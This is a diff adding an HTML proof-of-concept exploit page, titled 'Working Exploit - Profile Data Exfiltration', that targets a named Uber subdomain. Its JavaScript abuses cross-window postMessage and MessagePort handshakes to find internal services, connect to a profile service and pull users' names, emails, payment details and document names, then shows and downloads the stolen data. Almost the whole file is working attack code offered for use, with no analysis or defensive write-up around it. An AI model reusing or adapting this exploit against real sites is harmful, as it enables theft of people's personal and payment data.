@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Working Exploit - Profile Data Exfiltration</title>
+<style>
+body {
+    font-family: 'Courier New', monospace;
+    max-width: 1400px;
+    margin: 20px auto;
+    padding: 20px;
+    background: #1e1e1e;
+    color: #00ff00;
+}
+h1 {
+    color: #ff6b6b;
+    border-bottom: 2px solid #00ff00;
+    padding-bottom: 10px;
+}
+.stats {
+    display: flex;
+    gap: 15px;
+    margin: 20px 0;
+}
+.stat-box {
+    background: #2d2d2d;
+    border: 2px solid #00ff00;
+    padding: 15px;
+    border-radius: 5px;
+    text-align: center;
+    flex: 1;
+}
+.stat-number {
+    font-size: 32px;
+    font-weight: bold;
+    color: #ffd93d;
+}
+.stat-label {
+    font-size: 12px;
+    color: #6bcfff;
+    margin-top: 5px;
+}
+.section {
+    background: #2d2d2d;
+    border: 1px solid #00ff00;
+    padding: 15px;
+    margin: 15px 0;
+    border-radius: 5px;
+}
+button {
+    background: #00ff00;
+    color: #000;
+    border: none;
+    padding: 12px 20px;
+    margin: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    border-radius: 3px;
+    font-size: 14px;
+}
+button:hover {
+    background: #00cc00;
+}
+button.danger {
+    background: #ff6b6b;
+    color: #fff;
+}
+button.danger:hover {
+    background: #ff5252;
+}
+#output {
+    background: #000;
+    color: #00ff00;
+    padding: 15px;
+    margin-top: 10px;
+    height: 400px;
+    overflow-y: auto;
+    font-size: 12px;
+    border: 1px solid #00ff00;
+    border-radius: 3px;
+}
+.log-entry {
+    margin: 5px 0;
+    padding: 5px;
+    border-left: 3px solid #00ff00;
+    padding-left: 10px;
+}
+.log-success { border-left-color: #00ff00; color: #00ff00; }
+.log-error { border-left-color: #ff6b6b; color: #ff6b6b; }
+.log-data { border-left-color: #ffd93d; color: #ffd93d; }
+.log-info { border-left-color: #6bcfff; color: #6bcfff; }
+.exfiltrated-data {
+    background: #000;
+    border: 2px solid #ffd93d;
+    padding: 10px;
+    margin: 10px 0;
+    color: #ffd93d;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    max-height: 500px;
+    overflow-y: auto;
+    font-size: 11px;
+}
+.status {
+    display: inline-block;
+    padding: 5px 10px;
+    border-radius: 3px;
+    margin-left: 10px;
+    font-size: 12px;
+}
+.status.connected { background: #00ff00; color: #000; }
+.status.disconnected { background: #666; color: #fff; }
+.service-item {
+    background: #1a1a1a;
+    padding: 12px;
+    margin: 8px 0;
+    border-left: 3px solid #ffd93d;
+}
+.service-name {
+    color: #ffd93d;
+    font-weight: bold;
+    font-size: 14px;
+    margin-bottom: 8px;
+}
+.method-list {
+    color: #6bcfff;
+    font-size: 11px;
+    margin-left: 15px;
+}
+.method-item {
+    margin: 3px 0;
+}
+</style>
+</head>
+<body>
+<h1>🔓 WORKING EXPLOIT - Profile Data Exfiltration</h1>
+
+<div class="stats">
+    <div class="stat-box">
+        <div class="stat-number" id="services-count">0</div>
+        <div class="stat-label">Services Discovered</div>
+    </div>
+    <div class="stat-box">
+        <div class="stat-number" id="methods-count">0</div>
+        <div class="stat-label">Total Methods Available</div>
+    </div>
+    <div class="stat-box">
+        <div class="stat-number" id="data-count">0</div>
+        <div class="stat-label">Data Exfiltrated</div>
+    </div>
+</div>
+
+<div class="section">
+    <h3>Step 1: Open Target</h3>
+    <button onclick="openTarget()">🎯 Open Uber Site</button>
+    <span id="popup-status" class="status disconnected">Not Connected</span>
+</div>
+
+<div class="section">
+    <h3>Step 2: Discover Internal Services</h3>
+    <button onclick="discoverServices()">🔍 Discover Services</button>
+    <span id="discovery-status" class="status disconnected">Not Discovered</span>
+</div>
+
+<div class="section">
+    <h3>Step 3: Connect to Profile Service</h3>
+    <button class="danger" onclick="connectToProfile()">🔌 Connect to Profile Service</button>
+    <span id="connection-status" class="status disconnected">Not Connected</span>
+</div>
+
+<div class="section">
+    <h3>Step 4: Steal User Data</h3>
+    <button class="danger" onclick="stealData()">💀 EXFILTRATE USER DATA</button>
+</div>
+
+<div class="section">
+    <h3>📡 Discovered Internal Services & Methods</h3>
+    <div id="services-list" style="color: #888;">No services discovered yet...</div>
+</div>
+
+<div class="section">
+    <h3>📊 Exploitation Log</h3>
+    <button onclick="clearLog()" style="background: #666; color: #fff;">Clear Log</button>
+    <button onclick="downloadLog()" style="background: #ffd93d; color: #000;">💾 Download Log</button>
+    <div id="output"></div>
+</div>
+
+<div class="section">
+    <h3>💎 Exfiltrated User Data</h3>
+    <button onclick="downloadExfiltratedData()" style="background: #ffd93d; color: #000;">💾 Download Data</button>
+    <div id="stolen-data" class="exfiltrated-data">No data exfiltrated yet...</div>
+</div>
+
+<script>
+// Configuration
+const TARGET_ORIGIN = "https://earn-uberaisolutions.uber.com";
+const SERVICE_DISCOVERY_CHANNEL = "service-discovery";
+const TARGET_SERVICE = "f7-kwm-profile-management-service-provider";
+
+let targetWindow = null;
+let discoveryPort = null;
+let profilePort = null;
+let discoveredServices = [];
+let profileChannel = null;
+let exfiltratedData = null;
+let stats = { services: 0, methods: 0, data: 0 };
+
+// ============================================================================
+// STEP 1: Open Target
+// ============================================================================
+function openTarget() {
+    targetWindow = window.open(TARGET_ORIGIN, 'uberTarget', 'width=1200,height=800');
+    
+    if (targetWindow) {
+        log('✅ Target window opened', 'success');
+        log('⏳ Waiting 3 seconds for page load...', 'info');
+        document.getElementById('popup-status').className = 'status connected';
+        document.getElementById('popup-status').textContent = 'Connected';
+        
+        setTimeout(() => {
+            log('✅ Ready! Click "Discover Services"', 'success');
+        }, 3000);
+    } else {
+        log('❌ Popup blocked! Enable popups.', 'error');
+    }
+}
+
+// ============================================================================
+// STEP 2: Discover Services
+// ============================================================================
+function discoverServices() {
+    if (!targetWindow) {
+        log('❌ Open target first!', 'error');
+        return;
+    }
+    
+    log('🔍 Discovering internal services...', 'info');
+    
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: SERVICE_DISCOVERY_CHANNEL,
+        requestID: "discovery"
+    }, TARGET_ORIGIN);
+}
+
+// ============================================================================
+// STEP 3: Connect to Profile Service
+// ============================================================================
+function connectToProfile() {
+    if (!profileChannel) {
+        log('❌ Discover services first!', 'error');
+        return;
+    }
+    
+    log('🔌 Connecting to profile service...', 'info');
+    log('📡 Channel: ' + profileChannel, 'info');
+    
+    targetWindow.postMessage({
+        type: "REQUEST_CLIENT_PORT",
+        channel: profileChannel,
+        requestID: "connect-profile"
+    }, TARGET_ORIGIN);
+}
+
+// ============================================================================
+// STEP 4: Steal Data
+// ============================================================================
+function stealData() {
+    if (!profilePort) {
+        log('❌ Connect to profile service first!', 'error');
+        return;
+    }
+    
+    log('💀 EXFILTRATING USER DATA...', 'data');
+    
+    profilePort.postMessage({
+        type: "fetchProfileData",
+        requestID: "steal-data"
+    });
+}
+
+// ============================================================================
+// Message Handler
+// ============================================================================
+window.addEventListener('message', function(event) {
+    if (event.origin !== TARGET_ORIGIN) return;
+    
+    if (event.ports && event.ports[0]) {
+        const port = event.ports[0];
+        const requestID = event.data.requestID;
+        
+        if (requestID === "discovery") {
+            discoveryPort = port;
+            log('✅ Discovery port received', 'success');
+            
+            port.onmessage = handleDiscoveryResponse;
+            port.start();
+            
+            setTimeout(() => {
+                log('📤 Requesting service list...', 'info');
+                port.postMessage({ type: "LIST_PROVIDERS" });
+            }, 500);
+            
+        } else if (requestID === "connect-profile") {
+            profilePort = port;
+            log('✅ Profile service connected!', 'success');
+            document.getElementById('connection-status').className = 'status connected';
+            document.getElementById('connection-status').textContent = 'Connected';
+            
+            port.onmessage = handleProfileResponse;
+            port.start();
+            
+            log('✅ Ready to steal data! Click "EXFILTRATE USER DATA"', 'success');
+        }
+    }
+});
+
+// ============================================================================
+// Handle Discovery Response
+// ============================================================================
+function handleDiscoveryResponse(event) {
+    const data = event.data;
+    
+    if (data.payload && Array.isArray(data.payload)) {
+        discoveredServices = data.payload;
+        stats.services = data.payload.length;
+        stats.methods = 0;
+        
+        log('✅ Discovered ' + data.payload.length + ' services!', 'success');
+        
+        document.getElementById('discovery-status').className = 'status connected';
+        document.getElementById('discovery-status').textContent = stats.services + ' Services Found';
+        
+        // Find profile service channel
+        const profileService = data.payload.find(s => s.type === TARGET_SERVICE);
+        if (profileService) {
+            profileChannel = profileService.channelName;
+            log('✅ Found profile service: ' + profileChannel, 'success');
+        }
+        
+        // Display all services
+        let html = '';
+        data.payload.forEach(service => {
+            const methodCount = service.methodsList ? service.methodsList.length : 0;
+            stats.methods += methodCount;
+            
+            html += '<div class="service-item">';
+            html += '<div class="service-name">🔧 ' + service.type + '</div>';
+            html += '<div class="method-list">';
+            html += '<strong>' + methodCount + ' methods available:</strong><br>';
+            
+            if (service.methodsList) {
+                service.methodsList.forEach(method => {
+                    html += '<div class="method-item">• ' + method + '</div>';
+                });
+            }
+            
+            html += '</div></div>';
+        });
+        
+        document.getElementById('services-list').innerHTML = html;
+        document.getElementById('services-count').textContent = stats.services;
+        document.getElementById('methods-count').textContent = stats.methods;
+        
+        log('📊 Total: ' + stats.services + ' services, ' + stats.methods + ' methods', 'info');
+        log('✅ Ready! Click "Connect to Profile Service"', 'success');
+    }
+}
+
+// ============================================================================
+// Handle Profile Response
+// ============================================================================
+function handleProfileResponse(event) {
+    const data = event.data;
+    
+    if (data.requestID === "steal-data" && data.payload) {
+        log('🔥 DATA STOLEN!', 'data');
+        
+        exfiltratedData = data.payload;
+        stats.data = 1;
+        document.getElementById('data-count').textContent = stats.data;
+        
+        // Display the stolen data
+        const display = document.getElementById('stolen-data');
+        display.textContent = JSON.stringify(data.payload, null, 2);
+        
+        // Log key info
+        const profile = data.payload.userProfile || {};
+        log('💎 Name: ' + profile.firstName + ' ' + profile.lastName, 'data');
+        log('💎 Email: ' + profile.email, 'data');
+        log('💎 Country: ' + profile.countryIso2Code, 'data');
+        
+        if (profile.paymentDetails) {
+            log('💎 Payment: ' + JSON.stringify(profile.paymentDetails), 'data');
+        }
+        
+        if (profile.profileDocuments && profile.profileDocuments.length > 0) {
+            log('💎 Documents found: ' + profile.profileDocuments.length, 'data');
+            profile.profileDocuments.forEach(doc => {
+                log('  📄 ' + doc.originalFileName + ' (' + doc.category + ')', 'data');
+            });
+        }
+        
+        log('✅ Full data available in "Exfiltrated User Data" section', 'success');
+        
+        // Simulate sending to attacker server
+        console.log('🚨 EXFILTRATED DATA:', exfiltratedData);
+    }
+}
+
+// ============================================================================
+// Utility Functions
+// ============================================================================
+function clearLog() {
+    document.getElementById('output').innerHTML = '';
+    log('🧹 Log cleared', 'info');
+}
+
+function downloadLog() {
+    const output = document.getElementById('output');
+    const blob = new Blob([output.innerText], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'uber-exploit-log-' + Date.now() + '.txt';
+    a.click();
+    log('💾 Downloaded log file', 'success');
+}
+
+function downloadExfiltratedData() {
+    if (!exfiltratedData) {
+        log('❌ No data to download yet!', 'error');
+        return;
+    }
+    
+    const blob = new Blob([JSON.stringify(exfiltratedData, null, 2)], {type: 'application/json'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'uber-stolen-data-' + Date.now() + '.json';
+    a.click();
+    log('💾 Downloaded stolen data', 'success');
+}
+
+function log(message, type = 'info') {
+    const output = document.getElementById('output');
+    const entry = document.createElement('div');
+    entry.className = 'log-entry log-' + type;
+    const timestamp = new Date().toLocaleTimeString();
+    entry.textContent = '[' + timestamp + '] ' + message;
+    output.appendChild(entry);
+    output.scrollTop = output.scrollHeight;
+    console.log('[' + type.toUpperCase() + ']', message);
+}
+
+// ============================================================================
+// Initialize
+// ============================================================================
+log('🔓 Exploit PoC loaded', 'success');
+log('🎯 Target: ' + TARGET_ORIGIN, 'info');
+log('', 'info');
+log('STEPS:', 'success');
+log('1. Click "Open Uber Site"', 'info');
+log('2. Click "Discover Services"', 'info');
+log('3. Click "Connect to Profile Service"', 'info');
+log('4. Click "EXFILTRATE USER DATA"', 'info');
+</script>
+</body>
+</html>
